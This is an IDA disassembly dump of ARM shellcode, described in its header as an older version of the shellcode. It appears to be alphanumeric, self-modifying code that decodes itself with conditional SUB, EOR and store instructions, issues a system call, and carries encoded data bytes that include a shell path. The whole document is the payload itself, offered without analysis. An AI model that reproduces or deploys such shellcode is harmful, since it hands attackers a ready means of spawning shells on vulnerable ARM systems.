; IDA dump before execution.  Older version of shellcode.
; Segment type:	Pure code
		AREA ROM, CODE,	READWRITE, ALIGN=0
		CODE32
		RSBVS		R6, R2,	#0x20000006
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38

loc_4C					; DATA XREF: ROM:00000074o
		SUBPL		R3, R1,	#0x38

loc_50					; DATA XREF: ROM:00000078o
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		ADRMI		R3, loc_4C
		ADRPL		R3, loc_50
		LDRPLB		R3, [R3,#-0x30]
		LDRMIB		R3, [R3,#-0x30]
		SUBMIS		R5, R3,	#0x39
		SUBPLS		R5, R3,	#0x39
		SUBMI		R7, SP,	#0x30
		SUBMIS		R3, R3,	#0x38
		SUBPL		R6, R3,	R3,ROR#2
		SUBPL		R4, PC,	R3,ROR#2
		STMPLDB		R7, {R0,R4-R6,R8,LR}^
		SUBPL		R4, R3,	R3,ROR#2
		SUBPL		R5, R4,	#0x79
		SUBPL		R6, PC,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		STRPLB		R3, [R6,#-0x52]
		STRPLB		R3, [R6,#-0x53]
		STRPLB		R3, [R6,#-0x54]
		EORPLS		R3, R3,	#0x38
		SUBPL		R7, R3,	#0x39
		EORPLS		R5, R7,	#0x50
		SUBMI		R5, R3,	#0x36
		EORMIS		R5, R3,	#0x42
		EORPLS		R5, R5,	#0x6C
		STRPLB		R5, [R6,#-0x48]
		EORPLS		R5, R3,	#0x56
		EORPLS		R5, R5,	#0x41
		STRPLB		R5, [R6,#-0x46]
		STRPLB		R7, [R6,#-0x47]
		SUBPL		R3, R7,	#0x78
		SUBPL		R3, R3,	#0x78
		SUBPL		R3, R3,	#0x78
		SUBPL		R6, R6,	R3,ROR#2
		SUBPL		R6, R6,	R3,ROR#2
		EORPLS		R5, R7,	#0x61
		EORMIS		R5, R5,	#0x41
		STRMIB		R5, [R6,#-0x71]
		EORMIS		R7, R4,	#0x38
		SUBPL		R5, SP,	#0x30
		LDMPLDA		R5!, {R0-R2,R6,R8,LR}
		SUBPL		R7, R7,	#0x38
		SUBPL		R5, R4,	R4,ROR#2
		RSBPLS		R5, R5,	#0xF0000004
		EORMIS		R5, R5,	#0x30
		SUBMIS		R3, R5,	#0xF0000004
		SUBPL		R5, R5,	#0x34
		EORPLS		R7, R7,	R5,ROR#12
		EORPLS		R7, R7,	#0x32
		EORPLS		R7, R7,	#0x30
		EORPLS		R5, R5,	#0x30
		SVCMI		0x414141
		EORMIS		R5, R4,	#0x38
		SUBPL		R6, PC,	R1,ROR#2
		TEQPL		R0, R0,LSR R0
		SUBCCS		R4, R2,	R8,ROR R6
		SUBMI		R3, R6,	#0x350000
; ---------------------------------------------------------------------------
		DCB 0x76 ; v
		DCB 0x42 ; B
		DCB 0x30 ; 0
		DCB 0x47 ; G
		DCB 0x30 ; 0
		DCB 0x62 ; b
		DCB 0x69 ; i
		DCB 0x6E ; n
		DCB 0x30 ; 0
		DCB 0x73 ; s
		DCB 0x68 ; h
		DCB 0x30 ; 0
		DCB 0x30 ; 0
		DCB 0x6D ; m
		DCB 0x6E ; n
		DCB 0x74 ; t
		DCB 0x30 ; 0
		DCB 0x75 ; u
		DCB 0x73 ; s
		DCB 0x30 ; 0
		DCB 0x6A ; j
		DCB 0x62 ; b
		DCB 0x30 ; 0
		DCB 0x30 ; 0
		DCB 0x4D ; M
		DCB 0x30 ; 0
		DCB 0x62 ; b
		DCB 0x38 ; 8
		DCB 0x51 ; Q
		DCB 0x43 ; C
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x73 ; s
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x6F ; o
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x51 ; Q
		DCB 0x43 ; C
		DCB 0x61 ; a
		DCB 0x31 ; 1
		DCB 0x32 ; 2
		DCB 0x39 ; 9
		DCB 0x4A ; J
		DCB 0x42 ; B
		DCB 0x52 ; R
		DCB 0x42 ; B
		DCB 0x61 ; a
		DCB 0x43 ; C
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x76 ; v
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x76 ; v
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x76 ; v
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x77 ; w
		DCB 0x39 ; 9
		DCB 0x42 ; B
		DCB 0x54 ; T
		DCB 0x61 ; a
		DCB 0x43 ; C
		DCB 0x30 ; 0
		DCB 0x31 ; 1
		DCB 0x31 ; 1
		DCB 0x39 ; 9
		DCB 0x4F ; O
		DCB 0x42 ; B
		DCB 0x61 ; a
		DCB 0x43 ; C
		DCB 0x41 ; A
		DCB 0x31 ; 1
		DCB 0x36 ; 6
		DCB 0x39 ; 9
		DCB 0x4F ; O
		DCB 0x43 ; C
		DCB 0x6A ; j
		DCB 0x46 ; F
		DCB 0x61 ; a
		DCB 0x43 ; C
		DCB 0x50 ; P
		DCB 0x50 ; P
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x76 ; v
		DCB 0x39 ; 9
		DCB 0x7A ; z
		DCB 0x30 ; 0
		DCB 0x72 ; r
		DCB 0x38 ; 8
		DCB 0x50 ; P
		DCB 0x50 ; P
		DCB 0x7A ; z
		DCB 0x31 ; 1
		DCB 0x76 ; v
		DCB 0x39 ; 9
		DCB 0x54 ; T
		DCB 0x50 ; P
		DCB 0x51 ; Q
		DCB 0x42 ; B
		DCB 0x49 ; I
		DCB 0x42 ; B
		DCB 0x72 ; r
		DCB 0x30 ; 0
		DCB 0x7A ; z
		DCB 0x38 ; 8
		DCB 0x62 ; b
		DCB 0x43 ; C
		DCB 0x30, 0x30,
; ROM		ends

		END
